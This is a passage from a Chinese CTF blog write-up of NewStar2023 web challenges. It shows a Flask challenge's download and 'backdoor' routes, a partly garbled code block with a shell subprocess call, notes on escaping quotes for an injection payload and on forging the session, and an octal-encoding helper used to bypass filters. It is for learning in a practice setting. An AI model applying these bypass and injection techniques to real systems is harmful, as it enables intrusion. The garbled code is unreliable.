punctuation">&#125;</span></span><span class="token string"> &lt;br> &lt;a href=\"/cancanneed?file=1.jpg\">/cancanneed?file=1.jpg&lt;/a>"</span></span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/download"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    filename <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token keyword">if</span> filename<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="31"></td><td><pre>        filename <span class="token operator">=</span> filename<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'../'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        filename <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'static/img/'</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token punctuation">(</span><span class="token string">"start"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> filename<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="35"></td><td><pre>            <span class="token keyword">return</span> send_file<span class="token punctuation">(</span>filename<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="37"></td><td><pre>            abort<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="39"></td><td><pre>        abort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre></pre></td></tr><tr><td data-num="41"></td><td><pre></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/backdoor'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token keyword">def</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="44"></td><td><pre>    <span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="45"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="46"></td><td><pre>        <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="47"></td><td><pre>            session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"guest"</span></pre></td></tr><tr><td data-num="48"></td><td><pre>        name <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre>        <span class="token keyword">if</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span></pre></td></tr><tr><td data-num="50"></td><td><pre>                r'__<span class="token operator">|</span><span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>swig￼<span class="token number">0</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span>\<span class="token string">""</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>secret_key<span class="token punctuation">,</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="51"></td><td><pre>session_data <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>call<span class="token punctuation">(</span>command<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>这道题目的坑就在于如何处理 '\' 和双引号，转义字符很好理解，由于要运行两次 python 代码，所以需要四个，而双引号有两种转义方式，一种是 \\\&quot;，另一种是 \&quot;\&quot;。<br>在编程语言中，双引号（&quot;）通常用来表示字符串。在这种情况下，如果你需要在字符串中包含双引号本身，你需要对其进行转义，以告诉解释器这是一个普通字符而不是字符串的结束标志。在大部分编程语言中，使用双引号来表示字符串时，如果你想要在字符串中包含一个双引号字符，你需要使用转义字符（\）来转义它，即使用双引号对其进行转义，让解释器知道这是一个字符而不是字符串的结束。</p><p>在一些特定的情况下，比如构造 payload 用于利用漏洞或者在某些环境中执行代码时，需要特定格式的字符串。这可能需要多重转义，以确保最终的字符串在被解释执行时能够得到正确的解析。</p><p>因此，两个双引号（&quot;&quot;）的出现可能是为了在字符串中包含一个双引号字符，并且确保它在最终被解释执行时被视为普通字符而不是字符串的结束。</p><p>假设我们有一个字符串，要在其中包含双引号，并将其打印出来。在大多数编程语言中，如果我们想要打印 <code>&quot;Hello, &quot;World&quot;</code> 这个字符串，但我们并不想让双引号被解释为字符串的结束符，而是要作为字符串的一部分。在这种情况下，我们需要对双引号进行转义。</p><p>在 Python 中的示例：</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>pythonCopy code<span class="token comment"># 我们想要打印的字符串包含了双引号</span></pre></td></tr><tr><td data-num="2"></td><td><pre>my_string <span class="token operator">=</span> <span class="token string">"\"Hello, \\\"World\\\"\""</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment"># 将字符串打印出来</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>my_string<span class="token punctuation">)</span></pre></td></tr></table></figure><p>这个例子中， <code>my_string</code> 变量中包含了双引号，并使用了另一个双引号进行转义。如果我们直接使用 <code>&quot;Hello, &quot;World&quot;&quot;</code> 这种写法，Python 解释器会将第一个双引号解释为字符串开始，然后 <code>Hello,</code> 作为字符串内容，而在碰到第二个双引号时会将其解释为字符串的结束，导致语法错误。通过使用双引号进行转义，Python 解释器知道第二个双引号不是用于结束字符串，而是作为字符串的一部分。</p><p>将伪造的 session 传入即可，然后下面是官方 wp：</p><p>它的解法和我的区别就是在绕过。上，它是使用 attr 来绕过</p><p><span class="exturl" data-url="aHR0cHM6Ly9zaGltby5pbS9kb2NzL2dYcW1kVnZiT0VzWHBvM28vcmVhZA==">https://shimo.im/docs/gXqmdVvbOEsXpo3o/read</span></p><p>这里再说下这种写法：</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">def</span> <span class="token function">string_to_octal_ascii</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    octal_ascii <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">for</span> char <span class="token keyword">in</span> s<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        char_code <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        octal_ascii <span class="token operator">+=</span> <span class="token string">"\\\\"</span> <span class="token operator">+</span> <span class="token builtin">format</span><span class="token punctuation">(</span>char_code<span class="token punctuation">,</span> <span class="token string">'03o'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token comment"># octal_ascii += "\\\\" + format(char_code, 'o')</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">return</span> octal_ascii</pre></td></tr></table></figure><p>这种写法是 Python 中字符串格式化的一种方式，它使用了 <code>format()</code> 方法来将数值转换为指定格式的字符串。</p><p>在这个例子中， <code>format(char_code, '03o')</code> 的含义如下：</p><ul><li><code>char_code</code> 是一个整数变量，可能是字符的 Unicode 编码值。</li><li><code>'03o'</code> 是格式化字符串的格式说明符。</li><li><code>o</code> 表示将整数转换为八进制形式。</li><li><code>03</code> 表示生成的八进制字符串最少包含 3 位数字。如果不足 3 位，则在左侧用零进行填充。</li></ul><p>举个例子，如果 <code>char_code</code> 的值为 97（对应小写字母 'a' 的 Unicode 编码值），使用 <code>'03o'</code> 格式化后，就会生成字符串 <code>'141'</code> 。其中 <code>1</code> 代表八进制中的数值 1，而前面的 <code>14</code> 则是将 97 转换为八进制后得到的结果。这个格式化操作确保了生成的八进制字符串至少包含 3 位数字。</p><p>涨姿势了......</p><div class="tags"><a href="/tags/php%E6%98%AF%E4%B8%96%E7%95%8C%E4%B8%8A%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80/" rel="tag"><i class="ic i-tag"></i> php是世界上最好的语言</a> <a href="/tags/NewStar2023/" rel="tag"><i class="ic i-tag"></i> NewStar2023</a> <a href="/tags/%E6%88%91%E5%B0%B1%E6%98%AF%E6%AD%AA%E8%84%96/" rel="tag"><i class="ic i-tag"></i> 我就是歪脖</a> <a href="/tags/%E8%BF%99%E6%AC%A1%E4%B8%8D%E5%9D%90%E7%89%A2%E4%BA%86/" rel="tag"><i class="ic i-tag"></i> 这次不坐牢了</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2023-11-17 22:01:34" itemprop="dateModified" datetime="2023-11-17T22:01:34+08:00">2023-11-17</time></span></div><div class="reward"><button><i class="ic i-heartbeat"></i> 赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img data-src="/images/wechatpay.png" alt="p1kap1 微信支付"><p>微信支付</p></div><div><img data-src="/images/alipay.png" alt="p1kap1 支付宝"><p>支付宝</p></div><div><img data-src="/images/paypal.png" alt="p1kap1 贝宝"><p>贝宝</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>p1kap1 <i class="ic i-at"><em>@</em></i>P1kap1</li><li class="link"><strong>本文链接：</strong> <a href="https://p1kap1.github.io/CTF/web/NewStar2023week1-5/" title="NewStar2023-web-week1~5">https://p1kap1.github.io/CTF/web/NewStar2023week1-5/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/CTF/web/polar2023%E4%B8%AA%E4%BA%BA%E8%B5%9B/" itemprop="url" rel="prev" data-background-image="&#x2F;covers&#x2F;polar.png" title="polar2023个人赛"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> 无敌的Web</span><h3>polar2023个人赛</h3></a></div><div class="item right"><a href="/CTF/reverse/NewStar2023week1/" itemprop="url" rel="next" data-background-image="&#x2F;covers&#x2F;NewStarCTF20232.jpeg" title="NewStar2023week1-reverse"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> 逆天的reverse</span><h3>NewStar2023week1-reverse</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#week1"><span class="toc-number">1.</span> <span class="toc-text">Week1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E6%BC%8F%E7%9A%84%E7%A7%98%E5%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text">泄漏的秘密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#begin-of-upload"><span class="toc-number">1.2.</span> <span class="toc-text">Begin of Upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#begin-of-http"><span class="toc-number">1.3.</span> <span class="toc-text">Begin of HTTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#errorflask"><span class="toc-number">1.4.</span> <span class="toc-text">ErrorFlask</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#begin-of-php"><span class="toc-number">1.5.</span> <span class="toc-text">Begin of PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rce"><span class="toc-number">1.6.</span> <span class="toc-text">R!C!E!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easylogin"><span class="toc-number">1.7.</span> <span class="toc-text">EasyLogin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week2"><span class="toc-number">2.</span> <span class="toc-text">Week2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%B8%E6%88%8F%E9%AB%98%E6%89%8B"><span class="toc-number">2.1.</span> <span class="toc-text">游戏高手</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#include-0-0"><span class="toc-number">2.2.</span> <span class="toc-text">include 0。0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez_sql"><span class="toc-number">2.3.</span> <span class="toc-text">ez_sql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unserialize"><span class="toc-number">2.4.</span> <span class="toc-text">Unserialize？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#upload-again"><span class="toc-number">2.5.</span> <span class="toc-text">Upload again!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rce-2"><span class="toc-number">2.6.</span> <span class="toc-text">RCE!!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week3"><span class="toc-number">3.</span> <span class="toc-text">Week3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#include"><span class="toc-number">3.1.</span> <span class="toc-text">Include 🍐</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#medium_sql"><span class="toc-number">3.2.</span> <span class="toc-text">medium_sql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pop-gadget"><span class="toc-number">3.3.</span> <span class="toc-text">POP Gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rce-3"><span class="toc-number">3.4.</span> <span class="toc-text">R!C!E!!!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#genshin"><span class="toc-number">3.5.</span> <span class="toc-text">GenShin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#otenkigirl"><span class="toc-number">3.6.</span> <span class="toc-text">OtenkiGirl</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week4"><span class="toc-number">4.</span> <span class="toc-text">Week4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%83"><span class="toc-number">4.1.</span> <span class="toc-text">逃</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#more-fast"><span class="toc-number">4.2.</span> <span class="toc-text">More Fast</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#midsql"><span class="toc-number">4.3.</span> <span class="toc-text">midsql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flask-disk"><span class="toc-number">4.4.</span> <span class="toc-text">flask disk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#injectme"><span class="toc-number">4.5.</span> <span class="toc-text">InjectMe</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/CTF/web/NSS%E9%A2%98%E8%AE%B0-web%E7%AF%87/" rel="bookmark" title="NSS题记-web篇">NSS题记-web篇</a></li><li><a href="/CTF/web/NSSCTF-2nd-web/" rel="bookmark" title="NSSCTF-2nd-web">NSSCTF-2nd-web</a></li><li><a href="/CTF/web/SICTF2023-Round2/" rel="bookmark" title="SICTF2023-Round2">SICTF2023-Round2</a></li><li><a href="/CTF/web/polar2023%E4%B8%AA%E4%BA%BA%E8%B5%9B/" rel="bookmark" title="polar2023个人赛">polar2023个人赛</a></li><li class="active"><a href="/CTF/web/NewStar2023week1-5/" rel="bookmark" title="NewStar2023-web-week1~5">NewStar2023-web-week1~5</a></li><li><a href="/CTF/web/SP811/" rel="bookmark" title="2023柏鹭杯-wp">2023柏鹭杯-wp</a></li><li><a href="/CTF/web/FSCTF/" rel="bookmark" title="FSCTF 2023-wp">FSCTF 2023-wp</a></li><li><a href="/CTF/web/SHCTF/" rel="bookmark" title="SHCTF-WP">SHCTF-WP</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="p1kap1" data-src="/images/avatar.jpg"><p class="name" itemprop="name">p1kap1</p><div class="description" itemprop="description">明镜止水之心</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">15</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">6</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">11</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Axa2FwMQ==" title="https:&#x2F;&#x2F;github.com&#x2F;p1kap1"><i class="ic i-github"></i></span> <span class="exturl item music" data-url="aHR0cHM6Ly9tdXNpYy4xNjMuY29tLyMvdXNlci9ob21lP2lkPTE5MDA5MTg3MjE=" title="https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;1900918721"><i class="ic i-cloud-music"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/CTF/web/polar2023%E4%B8%AA%E4%BA%BA%E8%B5%9B/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/CTF/reverse/NewStar2023week1/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/knowledge/" title="分类于 杂谈小记">杂谈小记</a></div><span><a href="/knowledge/Linux%E5%AF%B9%E6%96%87%E4%BB%B6%E7%9A%84%E8%AF%BB%E5%8F%96%E5%91%BD%E4%BB%A4/" title="Linux对文件读取的命令">Linux对文件读取的命令</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/misc/" title="分类于 高贵的Misc">高贵的Misc</a></div><span><a href="/CTF/misc/NewStar2023week1/" title="NewStar2023week1-misc">NewStar2023week1-misc</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/web/" title="分类于 无敌的Web">无敌的Web</a></div><span><a href="/CTF/web/NSSCTF-2nd-web/" title="NSSCTF-2nd-web">NSSCTF-2nd-web</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/knowledge/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2023.12.1/" title="未命名">未命名</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/web/" title="分类于 无敌的Web">无敌的Web</a></div><span><a href="/CTF/web/NSS%E9%A2%98%E8%AE%B0-web%E7%AF%87/" title="NSS题记-web篇">NSS题记-web篇</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/knowledge/" title="分类于 杂谈小记">杂谈小记</a></div><span><a href="/knowledge/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%A5%87%E6%80%9D%E5%A6%99%E6%83%B3/" title="php反序列化的奇思妙想no.1">php反序列化的奇思妙想no.1</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/web/" title="分类于 无敌的Web">无敌的Web</a></div><span><a href="/CTF/web/polar2023%E4%B8%AA%E4%BA%BA%E8%B5%9B/" title="polar2023个人赛">polar2023个人赛</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/web/" title="分类于 无敌的Web">无敌的Web</a></div><span><a href="/CTF/web/SICTF2023-Round2/" title="SICTF2023-Round2">SICTF2023-Round2</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/web/" title="分类于 无敌的Web">无敌的Web</a></div><span><a href="/CTF/web/SP811/" title="2023柏鹭杯-wp">2023柏鹭杯-wp</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/web/" title="分类于 无敌的Web">无敌的Web</a></div><span><a href="/CTF/web/NewStar2023week1-5/" title="NewStar2023-web-week1~5">NewStar2023-web-week1~5</a></span></li></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2023</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">p1kap1 @ Clear Mind</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">221k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">3:21</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"CTF/web/NewStar2023week1-5/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html>